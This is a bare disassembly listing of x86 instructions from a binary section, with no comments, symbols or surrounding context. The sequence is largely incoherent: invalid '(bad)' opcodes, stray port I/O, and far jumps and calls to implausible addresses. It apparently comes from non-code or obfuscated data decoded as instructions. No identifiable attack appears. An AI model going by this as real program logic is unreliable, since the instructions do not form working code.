  41162a:	xor    BYTE PTR [ecx],dh
  41162c:	mov    edx,0x1037dc54
  411631:	inc    edi
  411632:	jg     0x41167f
  411634:	out    0x3c,eax
  411636:	add    al,0x5d
  411638:	fstp   st(5)
  41163a:	and    BYTE PTR [ebx+0x3c0a218b],bl
  411640:	adc    eax,0x444c261f
  411645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411646:	clc    
  411647:	xchg   DWORD PTR [ebx+0x546d4877],ecx
  41164d:	lods   al,BYTE PTR ds:[esi]
  41164e:	in     al,dx
  41164f:	cwde   
  411650:	pop    ebp
  411651:	pop    ebp
  411652:	mov    BYTE PTR [esi-0x1f],cl
  411655:	pop    ds
  411656:	loope  0x41161f
  411658:	dec    ebp
  411659:	jnp    0x4116ca
  41165b:	mov    dh,0x6d
  41165d:	mov    dl,0x8d
  41165f:	jg     0x411643
  411661:	(bad)  
  411662:	xchg   ebp,eax
  411663:	outs   dx,DWORD PTR ds:[esi]
  411664:	dec    ebx
  411665:	xor    ch,bl
  411667:	pop    edx
  411668:	mov    ah,cl
  41166a:	dec    ebx
  41166b:	call   0x668762ee
  411670:	(bad)  
  411671:	(bad)  
  411673:	lds    eax,FWORD PTR es:[esi+0x23f0efd4]
  41167a:	jmp    0xcdbebf13
  41167f:	pop    ss
  411680:	outs   dx,DWORD PTR gs:[esi]
  411682:	fdivr  QWORD PTR [edx+esi*8]
  411685:	or     DWORD PTR gs:[ecx+0x4848e12f],eax
  41168c:	cmp    DWORD PTR [ecx-0x12a1528f],ebx
  411692:	lock push esi
  411694:	adc    BYTE PTR [ecx+0x5a],dl
  411697:	push   0xb7d69fcf
  41169c:	xor    ebx,esi
  41169e:	test   DWORD PTR [eax],eax
  4116a0:	jbe    0x41167d
  4116a2:	sub    eax,0x88529dd4
  4116a7:	jle    0x411688
  4116a9:	dec    esp
  4116aa:	mov    ebx,0x18953386
  4116af:	inc    esi
  4116b0:	cs xchg edx,eax
  4116b2:	jmp    0x9b46d075
  4116b7:	adc    BYTE PTR [edx+0x3c931837],bh
  4116bd:	push   esp
  4116be:	jno    0x41164d
  4116c0:	add    bh,dh
  4116c2:	ins    BYTE PTR es:[edi],dx
  4116c3:	lahf   
  4116c4:	xor    BYTE PTR [edx-0x1c],bh
  4116c7:	mov    esi,0x83f05d9
  4116cc:	in     eax,0x28
  4116ce:	std    
  4116cf:	call   0xb494:0xc9286fed
  4116d6:	lods   al,BYTE PTR ds:[esi]
  4116d7:	or     al,0x85
  4116d9:	push   0x34
  4116db:	jl     0x4116c0
  4116dd:	jmp    0x51a8:0x931b1996
  4116e4:	mov    dh,0x45
  4116e6:	inc    esi
  4116e7:	push   ebx
  4116e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e9:	ja     0x41168a
  4116eb:	jb     0x411693
  4116ed:	aad    0xf2
  4116ef:	enter  0x645f,0x82
  4116f3:	sub    eax,0x1cc90ce
  4116f8:	cmp    ebp,0x16cdf84c
  4116fe:	dec    eax
  4116ff:	aam    0x4a
  411701:	adc    eax,DWORD PTR [ebp-0x4cbd8ef6]
  411707:	and    BYTE PTR [eax],dh
  411709:	outs   dx,BYTE PTR ds:[esi]
  41170a:	xchg   ebx,eax
  41170b:	int3   
  41170c:	iret   
  41170d:	nop
  41170e:	sub    dh,BYTE PTR [ebx+0x6f]
  411711:	sub    DWORD PTR [ecx+0x71],edx
  411714:	rcl    DWORD PTR [ebx],0xaa
  411717:	sbb    eax,0x991ffd91
  41171c:	lds    ebp,FWORD PTR [edi+eax*2+0x7d6b1f43]
  411723:	nop
  411724:	mov    ebp,0x2fdec13
  411729:	outs   dx,BYTE PTR ds:[esi]
  41172a:	jp     0x4116e3
  41172c:	cwde   
  41172d:	les    edx,FWORD PTR ds:[esi+0x1e5bf726]
  411734:	lahf   
  411735:	or     esp,DWORD PTR [eax-0x1b]
  411738:	or     DWORD PTR [edx],edx
  41173a:	hlt    
  41173b:	push   ecx
  41173c:	lea    ecx,[ebp-0x33]
  41173f:	es ret 0xe839
  411743:	imul   edx,DWORD PTR [edx+eiz*1+0x3e],0x25
  411748:	sub    DWORD PTR [edx],edx
  41174a:	sub    eax,0x43e3c2bb
  41174f:	mov    dh,0x3d
  411751:	and    ecx,DWORD PTR [esi-0x34]
  411754:	sbb    eax,0x1becbc2
  411759:	shr    BYTE PTR [edx+edx*1+0x6e],0x8f
  41175e:	add    BYTE PTR [eax-0x45],dh
  411761:	push   ebp
  411762:	sbb    DWORD PTR [edi-0x41],0xffffffa7
  411766:	aam    0x3d
  411768:	pushf  
  411769:	jl     0x411783
  41176b:	sbb    cl,cl
  41176d:	jle    0x411795
  41176f:	xor    ah,BYTE PTR [ecx+0x14fb10b4]
  411775:	je     0x411792
  411777:	mov    bh,0xed
  411779:	push   cs
  41177a:	icebp  
  41177b:	pushf  
  41177c:	sbb    BYTE PTR [esp+eax*4-0x48],bh
  411780:	cmp    dh,BYTE PTR [edx]
  411782:	xchg   esi,eax
  411783:	dec    ebp
  411784:	retf   
  411785:	(bad)  
  411786:	shl    DWORD PTR [eax],cl
  411788:	out    dx,eax
  411789:	fsubr  DWORD PTR [esi]
  41178b:	(bad)  
  41178c:	into   
  41178d:	push   cs
  41178e:	test   al,0xe0
  411790:	push   0x37
  411792:	mov    ah,0x74
  411794:	xchg   ebx,eax
  411795:	sbb    al,0xa7
  411797:	dec    esp
  411798:	sub    eax,0x8197df12
  41179d:	adc    eax,0xf36db2ad
  4117a2:	int3   
  4117a3:	daa    
  4117a4:	add    dl,0xc7
  4117a7:	(bad)  [edi+0x3e692e4a]
  4117ad:	jecxz  0x41180c
  4117af:	jmp    0x59ee:0xf0404d5e
  4117b6:	jo     0x4117e8
  4117b8:	cmc    
  4117b9:	and    al,0x1d
  4117bb:	cmc    
  4117bc:	and    eax,0xbd0bacec
  4117c1:	fadd   st,st(1)
  4117c3:	push   es
  4117c4:	pop    ss
  4117c5:	jnp    0x4117b1
  4117c7:	retf   0x4c22
  4117ca:	dec    DWORD PTR [ebp+eax*2-0x39]
  4117ce:	jp     0x411822
  4117d0:	pop    edx
  4117d1:	inc    eax
  4117d2:	inc    ebx
  4117d3:	mov    ch,0x54
  4117d5:	or     esi,ebx
  4117d7:	(bad)  
  4117d9:	and    ebp,DWORD PTR [esi+0x16414f3c]
  4117df:	pop    eax
  4117e0:	inc    esp
  4117e1:	aam    0xe9
  4117e3:	emms   
  4117e5:	pop    esp
  4117e6:	mov    esp,0x13f55cbe
  4117eb:	dec    eax
  4117ec:	add    BYTE PTR [esi-0x5d55e7fc],ch
  4117f2:	mov    al,BYTE PTR [eax+eax*4]
  4117f5:	push   eax
  4117f6:	mov    ecx,DWORD PTR [ecx]
  4117f8:	arpl   WORD PTR [ecx],sp
  4117fa:	stc    
  4117fb:	jmp    0x10b8:0xb718c909
  411802:	xchg   edi,eax
  411803:	retf   
  411804:	outs   dx,BYTE PTR ds:[esi]
  411805:	mov    ebx,0xa9abe574
  41180a:	pop    ds
  41180b:	inc    ecx
  41180c:	and    BYTE PTR [esi],dl
  41180e:	lock adc DWORD PTR [esi+esi*2],edx
  411812:	adc    eax,DWORD PTR [ebx+0x56]
  411815:	sbb    al,0xe7
  411817:	ror    bl,0x6f
  41181a:	(bad)  
  41181b:	shl    DWORD PTR [edi],cl
  41181d:	pop    esp
  41181e:	add    esp,DWORD PTR [ebx+eax*2]
  411821:	mov    edx,0x62246500
  411826:	pop    es
  411827:	sub    al,al
  411829:	leave  
  41182a:	mov    ds:0x4c7703ab,eax
  41182f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411830:	sbb    dh,BYTE PTR [edx-0x739f856f]
  411836:	std    
  411837:	add    bl,BYTE PTR [ecx+0x29efa706]
  41183d:	xchg   esi,eax
  41183e:	push   cs
  41183f:	xlat   BYTE PTR ds:[ebx]
  411840:	pop    es
  411841:	xchg   esi,eax
  411842:	sti    
  411843:	pop    ss
  411844:	fimul  WORD PTR [edi+eax*4]
  411847:	in     al,0x4e
  411849:	addr16 push edi
  41184b:	jge    0x41189a
  41184d:	jno    0x41183f
  41184f:	loop   0x4118cd
  411851:	sti    
  411852:	inc    esi
  411853:	jmp    0x1f5a:0x56f692eb
  41185a:	loop   0x411855
  41185c:	popf   
  41185d:	mov    bh,0x6b
  41185f:	add    ch,0xfa
  411862:	xlat   BYTE PTR ds:[ebx]
  411863:	pop    ecx
  411864:	lea    esi,[ebx]
  411866:	div    DWORD PTR [eax]
  411868:	nop
  411869:	jmp    0x9748c053
  41186e:	fucom  st(5)
  411870:	outs   dx,DWORD PTR ds:[esi]
  411871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411872:	in     eax,dx
  411873:	and    esi,DWORD PTR [ecx+ecx*1+0x21ac38d5]
  41187a:	data16 adc dh,BYTE PTR [eax-0x21]
  41187e:	cmp    ebp,eax
  411880:	and    bh,0x74
  411883:	(bad)  
  411884:	rcl    DWORD PTR [edx+ebp*4-0x15],cl
  411888:	repnz sbb DWORD PTR [ebx],ebp
  41188b:	jns    0x411836
  41188d:	call   0xcc7d:0x71acf56a
  411894:	jp     0x41190f
  411896:	pop    ebp
  411897:	mov    bl,0x9
  411899:	jne    0x4118d2
  41189b:	sbb    edx,DWORD PTR [ebx+0x3efe5ae9]
  4118a1:	mov    ds:0x9c6fb403,al
  4118a6:	mov    esi,0xf099ffc6
  4118ab:	push   ecx
  4118ac:	dec    esp
  4118ad:	cld    
  4118ae:	xchg   ebx,eax
  4118af:	out    0x2e,eax
  4118b1:	outs   dx,DWORD PTR ds:[esi]
  4118b2:	popf   
  4118b3:	test   al,0x32
  4118b5:	xchg   ebp,eax
  4118b6:	gs ret 
  4118b8:	in     al,0x5b
  4118ba:	sahf   
  4118bb:	push   cs
  4118bc:	scas   al,BYTE PTR es:[edi]
  4118bd:	cmp    al,0x31
  4118bf:	mov    eax,ds:0xc67ff4d4
  4118c4:	mov    dh,cl
  4118c6:	xlat   BYTE PTR ds:[ebx]
  4118c7:	push   eax
  4118c8:	(bad)  
  4118c9:	push   ebx
  4118ca:	mov    eax,ds:0xfc985833
  4118cf:	xchg   BYTE PTR [edx+0x4b8655a],cl
  4118d5:	inc    esi
  4118d6:	or     DWORD PTR [ebx],edi
  4118d8:	fild   WORD PTR [edx-0x6b]
  4118db:	outs   dx,DWORD PTR ds:[esi]
  4118dc:	dec    ecx
  4118dd:	dec    ecx
  4118de:	lock jbe 0x411914
  4118e1:	enter  0x4f71,0x95
  4118e5:	repz push eax
  4118e7:	pop    ds
  4118e8:	cmp    BYTE PTR [eax+0x17fd38c8],ch
  4118ee:	add    ch,ah
  4118f0:	inc    ebx
  4118f1:	adc    al,0xe0
  4118f3:	and    BYTE PTR [edx],0x1
  4118f6:	adc    DWORD PTR [eax],eax
  4118f8:	retf   0x2156
  4118fb:	cmp    BYTE PTR [ebp+0xe],bh
  4118fe:	mov    ds:0xd3ff37e7,al
  411903:	or     DWORD PTR [ebx+0x54495cba],ebp
  411909:	stc    
  41190a:	adc    BYTE PTR gs:[esi-0x7f9c7068],ah
  411911:	add    DWORD PTR [esp+ebp*8-0x17],ebp
  411915:	int3   
  411916:	xor    ebx,DWORD PTR ds:0xcdbaeda0
  41191c:	dec    ebp
  41191d:	xor    edi,ebx
  41191f:	aad    0xdc
  411921:	out    0x95,al
  411923:	out    0x65,al
  411925:	or     BYTE PTR [ebx-0x5a40dace],al
  41192b:	imul   esp,DWORD PTR [esi*2-0x5630b2ac],0x1d
  411933:	cmp    al,0x95
  411935:	add    eax,0x908d1e9d
  41193a:	js     0x411919
  41193c:	mov    BYTE PTR [esi+0x2ad609d0],ah
  411942:	ret    
  411943:	addr16 push esi
  411945:	add    esp,DWORD PTR [ebp-0x30]
  411948:	mov    WORD PTR [esi+edi*2-0x4e7aebf9],ss
  41194f:	sbb    al,0x37
  411951:	dec    ebx
  411952:	jmp    0x7957:0xc0f0ffff
  411959:	or     al,dh
  41195b:	jnp    0x411989
  41195d:	pop    ebp
  41195e:	clc    
  41195f:	adc    eax,0xb066b7da
  411964:	enter  0xecc2,0x17
  411968:	add    eax,0x291e6ea4
  41196d:	pusha  
  41196e:	lods   eax,DWORD PTR ds:[esi]
  41196f:	or     eax,0x7bc6c3c8
  411974:	lock add eax,DWORD PTR [eax+0x61]
  411978:	mov    ecx,0xfe5fcb8f
  41197d:	ds jge 0x4119d3
  411980:	mov    esp,0xaf5112f3
  411985:	int3   
  411986:	test   DWORD PTR [eax+0x59],edx
  411989:	ds inc ebx
  41198b:	(bad)  
  41198c:	adc    BYTE PTR [eax+0x43],dh
  41198f:	jo     0x41197f
  411991:	test   eax,0x16199632
  411996:	add    DWORD PTR [eax],ebx
  411998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411999:	adc    eax,0xfc71990e
  41199e:	push   ebx
  41199f:	mov    ebp,0x38107d43
  4119a4:	inc    ecx
  4119a5:	mov    eax,ds:0x195a04e6
  4119aa:	adc    al,0xcc
  4119ac:	into   
  4119ad:	jmp    0x4119ac
  4119af:	stos   DWORD PTR es:[edi],eax
  4119b0:	popf   
  4119b1:	(bad)  
  4119b2:	fst    DWORD PTR ds:[eax+edi*4]
  4119b6:	inc    esi
  4119b7:	(bad)  
  4119b8:	in     eax,0xf5
  4119ba:	fadd   DWORD PTR [ecx-0x7bfa3ad6]
  4119c0:	popa   
  4119c1:	mov    bl,0xe2
  4119c3:	cmp    DWORD PTR [ebx+eax*2+0x4],esi
  4119c7:	adc    DWORD PTR [ecx+0x1c],edi
  4119ca:	lock xchg ebx,eax
  4119cc:	out    0x91,eax
  4119ce:	jl     0x411a2e
  4119d0:	mov    bl,0x85
  4119d2:	jp     0x411a34
  4119d4:	sub    ebx,ebx
  4119d6:	aaa    
  4119d7:	cmp    bl,BYTE PTR [edi]
  4119d9:	jecxz  0x411960
  4119db:	fwait
  4119dc:	mov    DWORD PTR [edi-0x3567ade7],esp
  4119e2:	push   ebp
  4119e4:	mov    WORD PTR [edx-0x7439af8c],fs
  4119ea:	mov    ebx,0x35fe6f3d
  4119ef:	pop    esi
  4119f0:	sahf   
  4119f1:	rcr    DWORD PTR [edi-0x2b],1
  4119f4:	(bad)  
  4119f6:	div    BYTE PTR [eax-0x5]
  4119f9:	xchg   ecx,eax
  4119fa:	dec    edi
  4119fb:	dec    edi
  4119fc:	or     dh,BYTE PTR [ebp+0x74bf4658]
  411a02:	dec    esi
  411a03:	xchg   esi,eax
  411a04:	pop    esp
  411a05:	fcomip st,st(3)
  411a07:	popf   
  411a08:	int    0xaa
  411a0a:	sub    ebx,DWORD PTR [eax]
  411a0c:	dec    ebp
  411a0d:	addr16 mov dh,0xd8
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	in     eax,0xd5
  411a13:	sbb    eax,0x53308456
  411a18:	mov    BYTE PTR [eax+0x5a3b1f0b],0x76
  411a1f:	jmp    0x411a94
  411a21:	ficom  DWORD PTR [edx]
  411a23:	xchg   edx,eax
  411a24:	pop    edx
  411a25:	retf   0x29a6
  411a28:	jmp    0x8d55a979
  411a2d:	sub    cl,BYTE PTR [ebp-0x69fd870c]
  411a33:	inc    esi
  411a34:	inc    edx
  411a35:	xchg   DWORD PTR [esi+edx*1-0x10],edi
  411a39:	aaa    
  411a3a:	mov    esi,0x9994a447
  411a3f:	cmp    al,0xa2
  411a41:	adc    BYTE PTR [ecx+0x19c16422],ch
  411a47:	ss data16 ja 0x411a2b
  411a4b:	or     dl,BYTE PTR ds:0x62cb6ea9
  411a51:	or     ch,BYTE PTR ds:0xef28ce63
  411a57:	sub    al,0xb
  411a59:	mov    ch,0x9a
  411a5b:	dec    esp
  411a5c:	daa    
  411a5d:	jl     0x4119ee
  411a5f:	sbb    DWORD PTR [esi+0x574f885a],ecx
  411a65:	(bad)
  411a68:	hlt    
  411a69:	or     eax,0x5b759157
  411a6e:	and    BYTE PTR [eax],al
	...
  411c3c:	add    BYTE PTR [eax],al
  411c3e:	add    BYTE PTR [edi],ah
  411c40:	and    eax,0xbb873b85
  411c45:	mov    edi,0xe22d13d
  411c4a:	pusha  
  411c4b:	aaa    
  411c4c:	xchg   BYTE PTR [eax+0x177c330],bl
  411c52:	add    BYTE PTR ds:0x77000007,ah
  411c58:	fcomp  QWORD PTR [ebp+0x3f]
  411c5b:	mov    eax,0xef72e250
  411c60:	sti    
  411c61:	inc    ecx
  411c62:	sub    edx,DWORD PTR [ebx+0x6117f0a4]
  411c68:	cmp    eax,0x3a35674c
  411c6d:	daa    
  411c6e:	repnz push edi
  411c70:	arpl   WORD PTR [eax-0x22],bx
  411c73:	(bad)  [eax+0x33b24d23]
  411c79:	xchg   esp,ecx
  411c7b:	add    BYTE PTR [esi-0x7a],dh
  411c7e:	fsub   QWORD PTR [esi+0x2cf522ce]
  411c84:	test   al,0x10
  411c86:	mov    fs,WORD PTR [ebp-0x26]
  411c89:	push   eax
  411c8a:	inc    esp
  411c8b:	inc    esi
  411c8c:	popa   
  411c8d:	inc    ebp
  411c8e:	addr16 and eax,0xe7d71c9e
  411c94:	jnp    0x411cef
  411c96:	ss jecxz 0x411d15
  411c99:	shl    DWORD PTR [eax-0x17],0x27
  411c9d:	pop    ecx
  411c9e:	inc    edi
  411c9f:	retf   0x5608
  411ca2:	clc    
  411ca3:	in     al,0x1c
  411ca5:	pop    ds
  411ca6:	mov    WORD PTR [ebp+0x39],gs
  411ca9:	fs jp  0x411c48
  411cac:	inc    edx
  411cad:	(bad)  
  411cae:	pop    eax
  411caf:	fnstsw ax
  411cb1:	dec    esp
  411cb2:	sub    BYTE PTR [ebp-0x51457555],al
  411cb8:	aas    
  411cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cba:	les    esp,FWORD PTR [ebx-0x26f3f9a1]
  411cc0:	arpl   WORD PTR [esi-0x3a],di
  411cc3:	adc    al,0xb7
  411cc5:	mov    ds:0xf014aab4,al
  411cca:	ins    DWORD PTR es:[edi],dx
  411ccb:	punpcklwd mm2,mm5
  411cce:	stos   BYTE PTR es:[edi],al
  411ccf:	inc    ebx
  411cd0:	cs jle 0x411d39
  411cd3:	xor    eax,DWORD PTR [edx-0x7d]
  411cd6:	stos   DWORD PTR es:[edi],eax
  411cd7:	cmp    DWORD PTR [ebx-0x63],ebp
  411cda:	dec    edx
  411cdb:	xor    DWORD PTR [edi-0x1f],ebx
  411cde:	and    al,0xe3
  411ce0:	clc    
  411ce1:	popa   
  411ce2:	inc    esi
  411ce3:	out    0x89,eax
  411ce5:	sar    BYTE PTR [edx+edx*4],cl
  411ce8:	retf   
  411ce9:	ds pop esi
  411ceb:	mov    ecx,0xb859fbfe
  411cf0:	and    ecx,DWORD PTR [eax-0x75]
  411cf3:	or     esi,DWORD PTR [edx]
  411cf5:	int3   
  411cf6:	mov    cl,0x53
  411cf8:	jno    0x411ca2
  411cfa:	fsubr  QWORD PTR [ebp+0x61]
  411cfd:	xchg   ebx,eax
  411cfe:	int3   
  411cff:	xchg   edi,eax
  411d00:	xchg   BYTE PTR [esi-0x53],ch
  411d03:	or     al,0x77
  411d05:	fwait
  411d06:	mov    ds:0x7a09e398,al
  411d0b:	mov    esp,0x97bec1a4
  411d10:	jecxz  0x411d8d
  411d12:	outs   dx,BYTE PTR ds:[esi]
  411d13:	inc    eax
  411d14:	dec    BYTE PTR [ecx]
  411d16:	sti    
  411d17:	cmp    BYTE PTR [eax+0x543d6ef5],ah
  411d1d:	dec    edi
  411d1e:	dec    ebx
  411d1f:	leave  
  411d20:	cld    
  411d21:	mov    edi,0xe950f475
  411d26:	jp     0x411da0
  411d28:	xchg   esp,eax
  411d29:	scas   eax,DWORD PTR es:[edi]
  411d2a:	call   0xb8b9:0x81ee0283
  411d31:	cmp    al,0x86
  411d33:	fs jmp 0x9c64:0x1e30a8d2
  411d3b:	sahf   
  411d3c:	pop    ecx
  411d3d:	push   esp
  411d3e:	fisubr WORD PTR [ecx-0x70]
  411d41:	jl     0x411ce0
  411d43:	call   0xb9cce2c5
  411d48:	dec    edx
  411d49:	fwait
  411d4a:	mov    bh,0x95
  411d4c:	xchg   edx,eax
  411d4d:	mov    bh,0xcf
  411d4f:	and    eax,0xfd5df454
  411d54:	mov    eax,0xd946dae3
  411d59:	(bad)  
  411d5a:	out    0x1c,eax
  411d5c:	mov    bh,0x1f
  411d5e:	into   
  411d5f:	jbe    0x411d61
  411d61:	xchg   BYTE PTR [ebx-0xd],ah
  411d64:	sbb    DWORD PTR [edx+eax*8-0x31],esi
  411d68:	mov    dl,0x7f
  411d6a:	mov    bl,0x68
  411d6c:	leave  
  411d6d:	fwait
  411d6e:	sub    al,0x51
  411d70:	mov    edx,0xcda03e0e
  411d75:	push   eax
  411d76:	sub    eax,0x40da8368
  411d7b:	cmp    BYTE PTR [esi+0x4151317d],0xa2
  411d82:	daa    
  411d83:	fiadd  WORD PTR [eax+esi*4]
  411d86:	xchg   edi,eax
  411d87:	jge    0x411d2d
  411d89:	mov    esp,?
  411d8b:	rcl    BYTE PTR [ebx-0x25],cl
  411d8e:	fild   QWORD PTR [ecx+0x58]
  411d91:	inc    ecx
  411d92:	retf   0x5557
  411d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d96:	ret    0x2b23
  411d99:	pop    ds
  411d9a:	repnz push esp
  411d9c:	ror    bh,cl
  411d9e:	or     al,0x6a
  411da0:	aas    
  411da1:	jmp    0x411e17
  411da3:	or     BYTE PTR [ebx],ch
  411da5:	neg    BYTE PTR [edi+0x37]
  411da8:	(bad)  
  411da9:	cmp    bl,BYTE PTR [eax+ecx*1-0x6]
  411dad:	xchg   edx,eax
  411dae:	dec    esp
  411daf:	push   edx
  411db0:	fsubr  st,st(4)
  411db2:	test   DWORD PTR [eax],ecx
  411db4:	fstp   TBYTE PTR [ebp+0x3a6a7fd0]
  411dba:	pop    eax
  411dbb:	dec    ebx
  411dbc:	or     BYTE PTR [ecx-0x5ae95c69],cl
  411dc2:	test   DWORD PTR [eax-0x6a],edx
  411dc5:	mov    ebx,0x292745fc
  411dca:	xchg   edx,eax
  411dcb:	push   0xffffff9c
  411dcd:	popf   
  411dce:	scas   al,BYTE PTR es:[edi]
  411dcf:	xor    al,0x27
  411dd1:	data16 or al,0x49
  411dd4:	jnp    0x411dd5
  411dd6:	pop    edx
  411dd7:	clc    
  411dd8:	jo     0x411de0
  411dda:	adc    edi,DWORD PTR [edx]
  411ddc:	int3   
  411ddd:	arpl   WORD PTR [eax],di
  411ddf:	mov    dl,BYTE PTR [ebp-0x2167fd5]
  411de5:	shl    DWORD PTR [ebx+0x73],cl
  411de8:	jns    0x411e01
  411dea:	xchg   esp,eax
  411deb:	dec    eax
  411dec:	mov    ds:0xd9962a88,al
  411df1:	xchg   esi,eax
  411df2:	cld    
  411df3:	adc    bl,dh
  411df5:	dec    dh
  411df7:	mov    ch,0x4f
  411df9:	ja     0x411e32
  411dfb:	push   ebx
  411dfc:	jg     0x411dcb
  411dfe:	cmp    ebx,eax
  411e00:	push   ds
  411e01:	adc    BYTE PTR [edx],dl
  411e03:	mov    esi,DWORD PTR [ecx]
  411e05:	(bad)  
  411e06:	ins    DWORD PTR es:[edi],dx
  411e07:	leave  
  411e08:	and    edx,DWORD PTR [esi+0xbe777f3]
  411e0e:	mov    bl,dl
  411e10:	inc    ecx
  411e11:	add    eax,0xc9455753
  411e16:	es retf 0xc388
  411e1a:	lods   eax,DWORD PTR ds:[esi]
  411e1b:	(bad)  
  411e1c:	add    si,WORD PTR [ecx]
  411e1f:	dec    esp
  411e20:	cdq    
  411e21:	lar    edx,WORD PTR [edi+ebp*8]
  411e25:	or     BYTE PTR [edi],ah
  411e27:	out    0x43,al
  411e29:	call   0x4f475830
  411e2e:	or     DWORD PTR [eax-0x38],0x4a3749c2
  411e35:	xchg   edi,eax
  411e36:	push   esi
  411e37:	mov    ?,WORD PTR [esi+0x4b]
  411e3a:	leave  
  411e3b:	sub    esp,0xffffffe0
  411e3e:	mov    dl,0x68
  411e40:	cdq    
  411e41:	push   esi
  411e42:	or     eax,0xc6d6f0f5
  411e47:	push   esi
  411e48:	cld    
  411e49:	adc    ch,ch
  411e4b:	xor    edx,DWORD PTR [ebp-0x65]
  411e4e:	test   cl,dh
  411e50:	xor    eax,0xe51584a8
  411e55:	out    dx,eax
  411e56:	aas    
  411e57:	fstp   st(6)
  411e59:	xor    bl,BYTE PTR [edx-0x6b1efbba]
  411e5f:	shl    BYTE PTR [esi+0x46313d8f],0x60
  411e66:	das    
  411e67:	fnstcw WORD PTR [ebx+edx*4-0x1a48ad08]
  411e6e:	pop    ecx
  411e6f:	mov    dh,0x3d
  411e71:	pop    ebx
  411e72:	push   edx
  411e73:	xchg   esi,eax
  411e74:	sub    BYTE PTR [esi+esi*2+0x69],bl
  411e78:	pop    es
  411e79:	pop    esp
  411e7a:	aaa    
  411e7b:	fdiv   QWORD PTR [ecx]
  411e7d:	cli    
  411e7e:	or     ch,BYTE PTR [esp+eiz*2+0x45b16808]
  411e85:	jnp    0x411e52
  411e87:	pushf  
  411e88:	push   ebp
  411e89:	daa    
  411e8a:	jno    0x411eac
  411e8c:	or     eax,DWORD PTR [edi-0x55941774]
  411e92:	ins    DWORD PTR es:[edi],dx
  411e93:	mov    ecx,0xc26352ec
  411e98:	aad    0x99
  411e9a:	jecxz  0x411eca
  411e9c:	jmp    0x653:0x6fa7f256
  411ea3:	cmp    al,0xad
  411ea5:	pop    edi
  411ea6:	fs in  eax,dx
  411ea8:	inc    eax
  411ea9:	int3   
  411eaa:	mov    ebp,0xdafc2d5a
  411eaf:	cs cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411eb2:	jbe    0x411e73
  411eb4:	jp     0x411ec5
  411eb6:	ret    0x1ca2
  411eb9:	jae    0x411e68
  411ebb:	xchg   ch,ch
  411ebd:	jno    0x411f14
  411ebf:	into   
  411ec0:	push   cs
  411ec1:	mov    edi,0x9b002820
  411ec6:	lock iret 
  411ec8:	and    al,0x53
  411eca:	fwait
  411ecb:	call   0x7ae4b27
  411ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ed1:	adc    eax,esi
  411ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed4:	scas   eax,DWORD PTR es:[edi]
  411ed5:	cmp    edi,ecx
  411ed7:	xor    DWORD PTR [ebp+0x6016a74e],esp
  411edd:	cmp    BYTE PTR [ecx],0xbe
  411ee0:	std    
  411ee1:	pop    esi
  411ee2:	loopne 0x411e8c
  411ee4:	call   0x4a1452df
  411ee9:	out    0xd1,eax
  411eeb:	(bad)  
  411eec:	mov    esi,0x8c8d1fbd
  411ef1:	ror    DWORD PTR [ebx],0xa7
  411ef4:	shr    DWORD PTR [ebp-0x41],1
  411ef7:	lahf   
  411ef8:	mov    ah,cl
  411efa:	sub    DWORD PTR [edx+ecx*1],esp
  411efd:	dec    ebx
  411efe:	or     esp,ebx
  411f00:	ror    DWORD PTR [ecx],cl
  411f02:	jns    0x411f2f
  411f04:	outs   dx,BYTE PTR ds:[esi]
  411f05:	leave  
  411f06:	popf   
  411f07:	inc    edi
  411f08:	std    
  411f09:	add    al,0x38
  411f0b:	pop    ebx
  411f0c:	arpl   WORD PTR [ecx+0x22],dx
  411f0f:	mov    bl,0x29
  411f11:	imul   esp,edi,0x20
  411f14:	(bad)  
  411f15:	iret   
  411f16:	fsub   DWORD PTR [ecx-0x76]
  411f19:	lods   eax,DWORD PTR ds:[esi]
  411f1a:	cwde   
  411f1b:	ja     0x411f8c
  411f1d:	in     ax,0x11
  411f20:	mov    dh,0x8c
  411f22:	mov    cl,0xdf
  411f24:	arpl   dx,sp
  411f26:	pushf  
  411f27:	xor    ch,BYTE PTR [esi+0xf6e2d59]
  411f2d:	mov    al,ds:0x934cd523
  411f32:	imul   edi,DWORD PTR [edx+0x70],0xffffffb8
  411f36:	jl     0x411fab
  411f38:	jmp    0xa091f29b
  411f3d:	popa   
  411f3e:	(bad)  
  411f3f:	repz lea edx,[ecx]
  411f42:	les    esp,FWORD PTR [ebx-0x2e]
  411f45:	dec    ecx
  411f46:	push   0x4df3d2ff
  411f4b:	sbb    esi,DWORD PTR [ebp-0x70]
  411f4e:	sub    cl,dh
  411f50:	es test ah,ah
  411f53:	mov    edi,0xaf3acef4
  411f58:	scas   al,BYTE PTR es:[edi]
  411f59:	jb     0x411ee1
  411f5b:	mov    bh,BYTE PTR [ecx+ecx*1]
  411f5e:	and    al,0xa8
  411f60:	jb     0x411f35
  411f62:	cmp    eax,0x1cac42fe
  411f67:	lods   al,BYTE PTR ds:[esi]
  411f68:	fwait
  411f69:	jge    0x411f81
  411f6b:	int    0x40
  411f6d:	loopne 0x411f85
  411f6f:	add    eax,0x9745e6eb
  411f74:	cdq    
  411f75:	cmp    DWORD PTR fs:0x10c892eb,esi
  411f7c:	xchg   ebp,eax
  411f7d:	mov    esi,0xf3910d6b
  411f82:	push   ds
  411f83:	mov    bl,0x47
  411f85:	or     eax,0xbf822de3
  411f8a:	jbe    0x411ff8
  411f8c:	dec    edi
  411f8d:	jecxz  0x411fe3
  411f8f:	call   0xb2bd:0xb8594b72
  411f96:	xchg   edx,eax
  411f97:	jmp    0xce86f51
  411f9c:	and    eax,0xc10ee17f
  411fa1:	inc    ecx
  411fa2:	out    0x24,al
  411fa4:	(bad)  
  411fa6:	jno    0x412015
  411fa8:	xchg   ebp,eax
  411faa:	arpl   si,di
  411fac:	jbe    0x412000
  411fae:	and    eax,0x7d027614
  411fb3:	add    DWORD PTR [esi+0x53],esi
  411fb6:	mov    BYTE PTR [esi-0x49],cl
  411fb9:	lahf   
  411fba:	scas   eax,DWORD PTR es:[edi]
